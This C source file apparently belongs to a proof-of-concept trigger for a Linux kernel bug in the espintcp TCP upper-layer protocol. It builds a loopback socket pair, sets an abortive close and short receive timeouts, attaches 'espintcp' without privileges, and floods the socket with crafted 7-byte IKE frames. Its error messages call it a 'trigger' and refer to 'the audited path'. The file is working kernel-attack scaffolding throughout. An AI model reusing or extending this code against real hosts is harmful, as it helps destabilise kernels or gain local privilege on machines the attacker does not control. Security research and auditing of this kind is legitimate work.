#define _GNU_SOURCE

#include "socket_helpers.h"

#include "options.h"

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/time.h>

#define SOCKET_BUF_SIZE (4 * 1024 * 1024)

static const unsigned char ike_frame[7] = {
	0x00, 0x07,             /* full_len = 7 */
	0x00, 0x00, 0x00, 0x00, /* non-ESP marker = 0, handled as IKE */
	0x01,                   /* one payload byte so len > marker size */
};

int wait_readable_us(int fd, uint64_t timeout_us)
{
	struct pollfd pfd = {
		.fd = fd,
		.events = POLLIN | POLLERR | POLLHUP,
	};
	int timeout_ms;

	if (!timeout_us)
		return 0;

	timeout_ms = timeout_us > (uint64_t)INT_MAX * 1000ULL ?
		     INT_MAX : (int)((timeout_us + 999ULL) / 1000ULL);

	for (;;) {
		int ret = poll(&pfd, 1, timeout_ms);

		if (ret == 0)
			return 0;
		if (ret > 0)
			return (pfd.revents & POLLIN) ? 1 : -1;
		if (errno != EINTR)
			return -1;
	}
}

static int set_cloexec(int fd)
{
	int flags = fcntl(fd, F_GETFD);

	if (flags < 0)
		return -1;
	return fcntl(fd, F_SETFD, flags | FD_CLOEXEC);
}

void close_fd(int *fd)
{
	if (*fd < 0)
		return;

	close(*fd);
	*fd = -1;
}

void close_fd_record(int *fd, int *err)
{
	if (*fd < 0)
		return;

	if (close(*fd) != 0)
		*err = errno;
	*fd = -1;
}

static int set_nonblock(int fd)
{
	int flags = fcntl(fd, F_GETFL);

	if (flags < 0)
		return -1;
	return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static int set_socket_int(int fd, int level, int optname, int value)
{
	return setsockopt(fd, level, optname, &value, sizeof(value));
}

static int set_rcvtimeo_us(int fd, uint64_t usec)
{
	struct timeval tv;

	tv.tv_sec = (time_t)(usec / 1000000ULL);
	tv.tv_usec = (suseconds_t)(usec % 1000000ULL);
	return setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}

static int get_rcvtimeo_us(int fd, uint64_t *usec)
{
	struct timeval tv;
	socklen_t len = sizeof(tv);

	if (getsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, &len) != 0)
		return -1;
	if (tv.tv_sec < 0 || tv.tv_usec < 0)
		return -1;
	if ((uint64_t)tv.tv_sec > (UINT64_MAX - (uint64_t)tv.tv_usec) / 1000000ULL)
		return -1;

	*usec = (uint64_t)tv.tv_sec * 1000000ULL + (uint64_t)tv.tv_usec;
	return 0;
}

static int set_abortive_close(int fd)
{
	struct linger lin = {
		.l_onoff = 1,
		.l_linger = 0,
	};

	return setsockopt(fd, SOL_SOCKET, SO_LINGER, &lin, sizeof(lin));
}

static int enable_espintcp(int fd)
{
	const char ulp[] = "espintcp";

	return setsockopt(fd, IPPROTO_TCP, TCP_ULP, ulp, strlen(ulp));
}

static void explain_ulp_failure(int err)
{
	fprintf(stderr, "[-] setsockopt(TCP_ULP, \"espintcp\") failed: %s\n",
		strerror(err));
	if (err == ENOENT || err == ENOPROTOOPT) {
		fprintf(stderr,
			"[-] espintcp is not currently registered as a TCP ULP.\n"
			"    This trigger requires the ULP to be registered before attach.\n");
	} else if (err == EPERM || err == EACCES) {
		fprintf(stderr,
			"[-] The kernel or system policy refused the ULP attach.\n"
			"    Attaching an already registered ULP is not expected to require admin capabilities in the audited path.\n");
	}
}

int make_loopback_pair(const struct options *opts, struct socket_pair *pair)
{
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(addr);
	uint64_t rounded_rcvtimeo_us;
	int listen_fd = -1, target_fd = -1, peer_fd = -1;
	int one = 1;

	memset(pair, 0, sizeof(*pair));
	pair->target_fd = -1;
	pair->peer_fd = -1;

	listen_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_TCP);
	if (listen_fd < 0)
		goto fail;

	if (set_socket_int(listen_fd, SOL_SOCKET, SO_REUSEADDR, one) != 0)
		goto fail;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = htons(0);

	if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
		goto fail;
	if (getsockname(listen_fd, (struct sockaddr *)&addr, &addr_len) != 0)
		goto fail;
	if (listen(listen_fd, 1) != 0)
		goto fail;

	target_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_TCP);
	if (target_fd < 0)
		goto fail;

	if (connect(target_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
		goto fail;

	peer_fd = accept4(listen_fd, NULL, NULL, SOCK_CLOEXEC);
	if (peer_fd < 0) {
		peer_fd = accept(listen_fd, NULL, NULL);
		if (peer_fd < 0)
			goto fail;
		if (set_cloexec(peer_fd) != 0)
			goto fail;
	}

	close_fd(&listen_fd);

	if (set_socket_int(target_fd, SOL_SOCKET, SO_RCVBUF, SOCKET_BUF_SIZE) != 0)
		goto fail;
	if (set_socket_int(peer_fd, SOL_SOCKET, SO_SNDBUF, SOCKET_BUF_SIZE) != 0)
		goto fail;
	if (set_socket_int(peer_fd, IPPROTO_TCP, TCP_NODELAY, one) != 0)
		goto fail;
	if (set_socket_int(target_fd, IPPROTO_TCP, TCP_NODELAY, one) != 0)
		goto fail;
	if (set_nonblock(peer_fd) != 0)
		goto fail;
	if (set_rcvtimeo_us(target_fd, opts->rcvtimeo_us) != 0)
		goto fail;
	if (get_rcvtimeo_us(target_fd, &rounded_rcvtimeo_us) != 0)
		goto fail;
	if (!rounded_rcvtimeo_us) {
		errno = ERANGE;
		goto fail;
	}
	if (set_abortive_close(target_fd) != 0)
		goto fail;
	if (enable_espintcp(target_fd) != 0) {
		explain_ulp_failure(errno);
		goto fail;
	}

	pair->target_fd = target_fd;
	pair->peer_fd = peer_fd;
	pair->timer_wait_us = rounded_rcvtimeo_us;
	return 0;

fail:
	{
		int saved = errno;

		close_fd(&listen_fd);
		close_fd(&target_fd);
		close_fd(&peer_fd);
		errno = saved;
		return -1;
	}
}

ssize_t send_best_effort(int fd, const unsigned char *buf, size_t len)
{
	size_t off = 0;

	while (off < len) {
		size_t want = len - off;
		ssize_t n;

		n = send(fd, buf + off, want, MSG_NOSIGNAL);

		if (n > 0) {
			off += (size_t)n;
			continue;
		}
		if (n < 0 && errno == EINTR)
			continue;
		if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
			sched_yield();
			continue;
		}
		break;
	}

	return (ssize_t)off;
}

int prestack_ike_frames(int fd, uint64_t count)
{
	for (uint64_t i = 0; i < count; i++) {
		if (send_best_effort(fd, ike_frame, sizeof(ike_frame)) !=
		    (ssize_t)sizeof(ike_frame))
			return -1;
	}

	return 0;
}
